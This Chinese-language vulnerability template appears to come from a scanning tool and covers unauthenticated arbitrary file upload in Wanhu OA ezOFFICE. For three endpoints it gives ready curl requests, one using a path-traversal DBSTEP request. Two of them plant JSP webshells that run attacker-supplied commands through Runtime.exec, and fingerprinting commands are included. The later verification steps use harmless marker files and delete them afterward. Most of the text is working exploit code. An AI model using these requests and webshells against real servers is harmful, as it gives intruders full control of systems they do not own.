---
id: WANHU-FILE-UPLOAD
title: 万户OA ezOFFICE 多接口任意文件上传漏洞
product: wanhu-oa
vendor: 万户网络
version_affected: "all versions"
severity: CRITICAL
tags: [file_upload, rce, 无需认证, 国产, oa]
fingerprint: ["万户", "ezOFFICE", "万户网络"]
---

## 漏洞描述

万户OA（ezOFFICE）存在多个未授权文件上传接口，包括 OfficeServer.jsp、fileUpload.controller 和 smartUpload.jsp，攻击者无需认证即可上传任意 JSP 文件（webshell），获取服务器控制权限。

## 影响版本

- 万户OA ezOFFICE（所有已知版本）

## 前置条件

- 无需认证
- 目标运行万户OA ezOFFICE
- Web 应用端口可达

## 利用步骤

1. 通过指纹确认目标为万户OA
2. 选择可用的文件上传接口发送上传请求
3. 上传 JSP webshell
4. 访问上传的 webshell 执行命令

## Payload

**方式一：OfficeServer.jsp 上传（DBSTEP 协议）**

```bash
curl -s "http://target/defaultroot/public/iWebOfficeSign/OfficeServer.jsp" \
  -X POST \
  -H "Content-Type: application/octet-stream" \
  -d 'DBSTEP V3.0     170              0                1000              DBSTEP=REJTVEVQ
OPTION=U0FWRUZJTEU=
RECORDID=
isDoc=dHJ1ZQ==
moduleType=Z292ZG9jdW1lbnQ=
FILETYPE=Li4vLi4vcHVibGljL2VkaXQvc2hlbGwuanNw
111111111111111111111111111111111111111111111111
<% out.println("WANHU_VULN_TEST"); %>'
```

上传后访问：`http://target/defaultroot/public/edit/shell.jsp`

**方式二：fileUpload.controller 上传（Multipart）**

```bash
curl -s "http://target/defaultroot/upload/fileUpload.controller" \
  -X POST \
  -H "Content-Type: multipart/form-data; boundary=----Boundary" \
  -d '------Boundary
Content-Disposition: form-data; name="file"; filename="cmd.jsp"
Content-Type: application/octet-stream

<% out.println(Runtime.getRuntime().exec(request.getParameter("cmd"))); %>
------Boundary--'
```

上传后访问：`http://target/defaultroot/upload/html/<返回的文件名>.jsp`

**方式三：smartUpload.jsp 上传（fileType 白名单包含 jsp）**

```bash
curl -s "http://target/defaultroot/extension/smartUpload.jsp?path=information&mode=add&fileName=infoPicName&saveName=infoPicSaveName&tableName=infoPicTable&fileMaxSize=0&fileMaxNum=0&fileType=gif,jpg,bmp,jsp,png&fileMinWidth=0&fileMinHeight=0&fileMaxWidth=0&fileMaxHeight=0" \
  -X POST \
  -H "Content-Type: multipart/form-data; boundary=----Boundary" \
  -d '------Boundary
Content-Disposition: form-data; name="photo"; filename="shell.jsp"
Content-Type: application/octet-stream

<% out.println(Runtime.getRuntime().exec(request.getParameter("cmd"))); %>
------Boundary
Content-Disposition: form-data; name="continueUpload"

1
------Boundary--'
```

上传后访问：`http://target/defaultroot/upload/information/<返回的文件名>.jsp`

## 验证方法

上传接口返回什么状态码都不算数，判据是上传的标记文件能被 GET 回读到。每个接口传一个只输出本次标记串的无马文件，回读成功即确认，随后删掉。

方式一（OfficeServer.jsp，DBSTEP 协议）：`FILETYPE` 用本次唯一的文件名，文件体只输出标记串。

```bash
# 把上面 Payload 的 FILETYPE 换成 ../public/edit/poc-POC_TOKEN.jsp，
# 文件体换成：<% out.println("POC_TOKEN"); %>

curl -s "http://target/defaultroot/public/edit/poc-POC_TOKEN.jsp" | grep "POC_TOKEN"
# 回读出现 POC_TOKEN 即上传通道可用；随后删除该文件
```

方式二（fileUpload.controller）：上传后从响应里取回显的文件名，再回读。

```bash
printf 'POC_TOKEN' > poc-POC_TOKEN.txt
curl -s "http://target/defaultroot/upload/fileUpload.controller" \
  -X POST \
  -F "file=@poc-POC_TOKEN.txt;filename=poc-POC_TOKEN.txt"

# 响应里会带出实际落盘文件名，用它回读
curl -s "http://target/defaultroot/upload/html/<返回的文件名>" | grep "POC_TOKEN"
```

方式三（smartUpload.jsp）：`fileName`/`saveName` 用本次唯一串，POST 后在 `upload/information/` 下回读该串。

```bash
curl -s "http://target/defaultroot/upload/information/<返回的文件名>" | grep "POC_TOKEN"
```

判据：GET 回读到的内容里出现本次的 `POC_TOKEN`，说明文件按我们的名字落到了 Web 目录。清理：回读验证后逐个 DELETE 掉 `poc-POC_TOKEN.*` 文件。

反例：上传请求返回 200，或目录列表页返回 200，但 GET 目标文件名得到 404 或空内容 —— 只是接口收了请求，任意文件上传不成立。

## 指纹确认

```bash
curl -s "http://target/defaultroot/" | grep -i "ezOFFICE\|万户"
curl -s "http://target/defaultroot/login.jsp" -o /dev/null -w "%{http_code}"
```

## 参考链接

- https://www.cnblogs.com/wanhu-oa/
